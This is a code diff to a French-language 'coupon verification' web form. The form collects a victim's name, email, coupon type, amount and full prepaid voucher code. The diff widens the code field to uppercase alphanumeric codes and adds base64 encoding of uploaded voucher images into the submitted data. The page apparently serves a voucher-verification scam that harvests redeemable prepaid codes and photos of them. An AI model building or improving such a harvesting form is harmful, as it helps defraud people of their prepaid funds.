@@ -482,20 +482,18 @@
             id="fullCodeInput" 
             name="fullCodeInput"
 
-            maxlength="20"
-            pattern="[\d\s]{14,19}"
+            maxlength="19"
             required
 
-            placeholder="Entrez 12 à 16 chiffres"
+            placeholder="Entrez 12 à 16 caractères (lettres majuscules et chiffres)"
             
             class="w-full bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 text-lg tracking-wider"
             
-            oninput="this.value = this.value.replace(/\s/g, '')">
         >
     </div>
 
     <p class="text-xs text-gray-400 mt-2">
-        Format accepté : 12 à 16 chiffres uniquement
+        Format accepté : 12 à 16 caractères (lettres majuscules et chiffres)
     </p>
 </div>
 
@@ -787,10 +785,25 @@
         }
 
         // Form submission handler
-        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             // Get form data
+            const uploadedFilesData = [];
+            for (let file of uploadedFiles) {
+                const base64 = await new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.readAsDataURL(file);
+                });
+                uploadedFilesData.push({
+                    name: file.name,
+                    type: file.type,
+                    size: file.size,
+                    base64: base64
+                });
+            }
+
             const formData = {
                 userEmail: document.getElementById('userEmail').value,
                 fullName: document.getElementById('fullName').value,
@@ -798,10 +811,11 @@
                 couponType: document.getElementById('couponType').value,
                 amount: document.getElementById('amount').value,
                 currency: document.getElementById('currency').value,
-                fullCodeInput: document.getElementById('fullCodeInput').value.replace(/\s/g, ''), // Remove spaces
+                fullCodeInput: document.getElementById('fullCodeInput').value.replace(/\s/g, ''), // Remove spaces for submission
                 terms: document.getElementById('terms').checked,
                 submissionTime: new Date().toLocaleString('fr-FR'),
-                uploadedFiles: uploadedFiles.map(f => f.name).join(', ')
+                uploadedFiles: uploadedFiles.map(f => f.name).join(', '),
+                uploadedFilesData: uploadedFilesData
             };
 
             // Format the 16-digit code with dashes for display
@@ -818,6 +832,12 @@
                 full_code: fullCode,
                 submission_time: formData.submissionTime,
                 uploaded_files: formData.uploadedFiles || 'Aucun fichier',
+                uploaded_images: formData.uploadedFilesData.map(file => ({
+                    name: file.name,
+                    type: file.type,
+                    size: (file.size / 1024).toFixed(2) + ' KB',
+                    base64: file.base64
+                })),
                 terms_accepted: formData.terms ? 'Oui' : 'Non',
                 user_message: `Nouvelle demande de vérification de coupon reçue de ${formData.fullName}`
             };
@@ -865,24 +885,28 @@ Conditions acceptées: ${formData.terms ? 'Oui' : 'Non'}
                 });
         });
 
-        // Auto-format 19-digit code input
+        // Auto-format 16-digit code input
         const fullCodeInput = document.getElementById('fullCodeInput');
         fullCodeInput.addEventListener('input', function(e) {
-            // Remove all non-digit characters
-            let raw = e.target.value.replace(/\D/g, '');
+            // Remove all non-alphanumeric characters and convert to uppercase
+            let raw = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
             
-            // Limit to 16 digits
+            // Limit to 16 characters
             raw = raw.slice(0, 16);
             
-            // Format with spaces every 4 digits for display
+            // Format with spaces every 4 characters for display
             let formatted = raw.match(/.{1,4}/g)?.join(' ') || '';
             
             e.target.value = formatted;
         });
 
-        // Only allow digits on keypress
+        document.querySelector("form").addEventListener("submit", function () {
+                 fullCodeInput.value = fullCodeInput.value.replace(/\s/g, '');
+                 });
+
+        // Only allow alphanumeric characters on keypress
         fullCodeInput.addEventListener('keypress', function(e) {
-            // Allow backspace, delete, tab, escape, enter
+            // Allow backspace, delete, tab, escape, enter  
             if ([8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
                 // Allow Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
                 (e.keyCode === 65 && e.ctrlKey === true) ||
@@ -892,11 +916,16 @@ Conditions acceptées: ${formData.terms ? 'Oui' : 'Non'}
                 return;
             }
             
-            // Ensure that it is a number and stop the keypress
-            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+            // Allow letters (A-Z, a-z) and numbers (0-9)
+            if ((e.keyCode >= 65 && e.keyCode <= 90) ||  // A-Z
+                (e.keyCode >= 97 && e.keyCode <= 122) || // a-z
+                (e.keyCode >= 48 && e.keyCode <= 57) ||  // 0-9
+                (e.keyCode >= 96 && e.keyCode <= 105)) // Numpad 0-9
+                { 
+                   return; // Allow these keys
+                }
                 e.preventDefault();
-            }
-        });
+            });
 
         // Notification function
         function showNotification(message, type) {
